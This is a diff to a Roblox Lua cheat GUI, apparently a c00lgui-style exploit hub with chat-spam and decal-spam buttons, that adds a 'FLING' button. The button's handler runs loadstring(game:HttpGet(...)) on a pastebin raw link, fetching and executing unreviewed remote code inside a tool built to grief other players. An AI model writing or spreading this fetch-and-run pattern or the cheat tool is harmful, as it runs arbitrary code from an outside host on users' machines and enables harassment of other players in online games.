@@ -23,6 +23,7 @@ local MUSIC1 = Instance.new("TextButton")
 local CHATSPAMMER = Instance.new("TextButton")
 local C00lGUI = Instance.new("TextButton")
 local C00ZBDDKIDDIFY = Instance.new("TextButton")
+local FLING = Instance.new("TextButton")
 local PAGE2 = Instance.new("TextButton")
 local PAGE1 = Instance.new("TextButton")
 
@@ -653,6 +654,22 @@ function decalspam(id) --use this function, not the one on top
 		end
 	end
 end
+end)
+FLING.Parent = Frame
+FLING.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+FLING.Visible = false
+FLING.BorderColor3 = Color3.fromRGB(196, 40, 28)
+FLING.BorderSizePixel = 3
+FLING.Position = UDim2.new(0.4, 0, 0.75, 0)
+FLING.Size = UDim2.new(0, 70, 0, 27)
+FLING.Font = Enum.Font.SourceSans
+FLING.Text = "FLING"
+FLING.TextColor3 = Color3.fromRGB(242, 243, 243)
+FLING.TextScaled = true
+FLING.TextSize = 14.000
+FLING.TextWrapped = true
+FLING.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
 end)
 -- Next :
 
